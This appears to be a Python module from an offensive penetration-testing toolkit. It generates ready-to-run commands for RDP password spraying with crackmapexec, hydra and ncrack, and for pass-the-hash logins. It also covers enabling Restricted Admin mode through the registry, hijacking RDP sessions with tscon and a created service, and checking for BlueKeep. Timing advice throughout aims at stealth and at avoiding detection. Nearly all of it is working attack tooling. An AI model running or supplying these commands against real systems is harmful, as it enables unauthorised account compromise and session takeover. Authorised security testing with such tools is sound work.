"""
AIPTX Beast Mode - RDP Credential Spraying
==========================================

RDP-specific credential spraying and session management.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class RDPSprayResult:
    """Result of RDP spray attempt."""
    target: str
    port: int
    username: str
    password: str
    success: bool
    nla_enabled: bool = True
    admin_access: bool = False
    message: str = ""
    error: str | None = None


class RDPSprayer:
    """
    RDP-specific credential spraying.

    Supports NLA and non-NLA authentication testing.
    """

    def __init__(self, port: int = 3389, domain: str | None = None):
        """
        Initialize RDP sprayer.

        Args:
            port: RDP port
            domain: Windows domain name
        """
        self.port = port
        self.domain = domain
        self._results: list[RDPSprayResult] = []

    def get_cme_command(
        self,
        target: str,
        usernames: list[str],
        password: str,
    ) -> dict[str, str]:
        """
        Get CrackMapExec RDP spray command.

        Args:
            target: Target IP
            usernames: List of usernames
            password: Password to spray

        Returns:
            CME command configuration
        """
        user_str = " ".join(f"'{u}'" for u in usernames)
        domain_opt = f"-d {self.domain}" if self.domain else ""

        return {
            "command": f"crackmapexec rdp {target}:{self.port} -u {user_str} -p '{password}' {domain_opt}",
            "description": f"CME RDP spray with password: {password[:3]}***",
            "success_indicator": "[+]",
            "notes": "RDP is slow, be patient",
        }

    def get_hydra_command(
        self,
        target: str,
        user_file: str,
        pass_file: str,
        threads: int = 1,  # RDP is slow
    ) -> dict[str, str]:
        """
        Get Hydra RDP spray command.

        Args:
            target: Target IP
            user_file: Path to username file
            pass_file: Path to password file
            threads: Concurrent threads (keep low for RDP)

        Returns:
            Hydra command configuration
        """
        return {
            "command": f"hydra -L {user_file} -P {pass_file} rdp://{target}:{self.port} -t {threads} -W 10",
            "description": f"Hydra RDP spray against {target}",
            "notes": "RDP is slow, -t 1 recommended to avoid detection",
        }

    def get_ncrack_command(
        self,
        target: str,
        user_file: str,
        pass_file: str,
    ) -> dict[str, str]:
        """
        Get ncrack RDP spray command.

        Args:
            target: Target IP
            user_file: Path to username file
            pass_file: Path to password file

        Returns:
            ncrack command configuration
        """
        return {
            "command": f"ncrack -p {self.port} --user {user_file} --pass {pass_file} rdp://{target}",
            "description": f"ncrack RDP spray against {target}",
        }

    def get_xfreerdp_check(
        self,
        target: str,
        username: str,
        password: str,
    ) -> dict[str, str]:
        """
        Get xfreerdp authentication check command.

        Args:
            target: Target IP
            username: Username
            password: Password

        Returns:
            xfreerdp command configuration
        """
        user_str = f"{self.domain}\\{username}" if self.domain else username

        return {
            "command": f"xfreerdp /v:{target}:{self.port} /u:'{user_str}' /p:'{password}' /cert-ignore +auth-only 2>&1",
            "description": f"Test RDP auth for {user_str}@{target}",
            "success_indicators": ["Authentication only", "LOGON_TYPE"],
            "failure_indicators": ["ERRCONNECT", "LOGON_FAILURE"],
        }

    def get_rdp_check_commands(self, target: str) -> list[dict[str, str]]:
        """
        Get RDP service check commands.

        Args:
            target: Target IP

        Returns:
            RDP check commands
        """
        return [
            {
                "name": "nmap_rdp",
                "command": f"nmap -p {self.port} -sV --script rdp-enum-encryption {target}",
                "description": "Check RDP encryption",
            },
            {
                "name": "rdp_check",
                "command": f"rdp-check {target}",
                "description": "Check RDP accessibility",
            },
            {
                "name": "nla_check",
                "command": f"nmap -p {self.port} --script rdp-ntlm-info {target}",
                "description": "Check NLA and get NTLM info",
            },
        ]

    def get_rdp_connection_command(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash_auth: str | None = None,
    ) -> dict[str, str]:
        """
        Get RDP connection command.

        Args:
            target: Target IP
            username: Username
            password: Password
            hash_auth: NTLM hash for PTH

        Returns:
            RDP connection command
        """
        user_str = f"{self.domain}\\{username}" if self.domain else username

        if hash_auth:
            # Pass-the-hash with xfreerdp
            return {
                "command": f"xfreerdp /v:{target}:{self.port} /u:'{user_str}' /pth:'{hash_auth}' /cert-ignore",
                "description": f"RDP PTH connection to {target}",
                "notes": "Requires restricted admin mode on target",
            }
        else:
            return {
                "command": f"xfreerdp /v:{target}:{self.port} /u:'{user_str}' /p:'{password}' /cert-ignore /dynamic-resolution",
                "description": f"RDP connection to {target}",
            }

    def get_rdp_pth_commands(
        self,
        target: str,
        username: str,
        ntlm_hash: str,
    ) -> list[dict[str, str]]:
        """
        Get RDP pass-the-hash commands.

        Args:
            target: Target IP
            username: Username
            ntlm_hash: NTLM hash

        Returns:
            RDP PTH commands
        """
        user_str = f"{self.domain}\\{username}" if self.domain else username

        return [
            {
                "name": "xfreerdp_pth",
                "command": f"xfreerdp /v:{target}:{self.port} /u:'{user_str}' /pth:'{ntlm_hash}' /cert-ignore",
                "description": "xfreerdp pass-the-hash",
                "notes": "Requires Restricted Admin mode",
            },
            {
                "name": "enable_restricted_admin",
                "command": f"reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0",
                "description": "Enable Restricted Admin (run on target)",
                "requires_admin": True,
            },
            {
                "name": "check_restricted_admin",
                "command": f"reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin",
                "description": "Check if Restricted Admin is enabled",
            },
        ]

    def get_rdp_session_hijack_commands(self, target_session: int = 1) -> list[dict[str, str]]:
        """
        Get RDP session hijacking commands.

        Args:
            target_session: Session ID to hijack

        Returns:
            Session hijack commands
        """
        return [
            {
                "name": "list_sessions",
                "command": "query session",
                "description": "List RDP sessions",
            },
            {
                "name": "hijack_session",
                "command": f"tscon {target_session} /dest:console",
                "description": f"Hijack session {target_session}",
                "requires": "SYSTEM privileges",
            },
            {
                "name": "create_service",
                "command": f'sc create sesshijack binpath= "cmd.exe /k tscon {target_session} /dest:console"',
                "description": "Create service for session hijack",
                "requires": "Admin privileges",
            },
            {
                "name": "psexec_hijack",
                "command": f"psexec -s -i {target_session} cmd.exe",
                "description": "PsExec session interaction",
            },
        ]

    def get_bluekeep_check(self, target: str) -> dict[str, str]:
        """
        Get BlueKeep (CVE-2019-0708) vulnerability check.

        Args:
            target: Target IP

        Returns:
            BlueKeep check command
        """
        return {
            "command": f"nmap -p {self.port} --script rdp-vuln-ms12-020 {target}",
            "description": "Check for BlueKeep vulnerability",
            "cve": "CVE-2019-0708",
            "notes": "Also checks MS12-020",
        }

    def get_spray_timing_recommendations(self) -> dict[str, Any]:
        """Get timing recommendations for RDP spraying."""
        return {
            "delay_between_attempts": 5,  # seconds
            "delay_between_users": 60,  # seconds
            "max_concurrent": 1,
            "notes": [
                "RDP authentication is slow (~3-5 seconds per attempt)",
                "Use single thread to avoid overloading",
                "Account lockout policies typically apply",
                "Consider business hours for stealth",
            ],
            "estimated_time": {
                "10_users_3_passwords": "~5-10 minutes",
                "50_users_3_passwords": "~25-50 minutes",
                "100_users_3_passwords": "~1-2 hours",
            },
        }


__all__ = [
    "RDPSprayResult",
    "RDPSprayer",
]
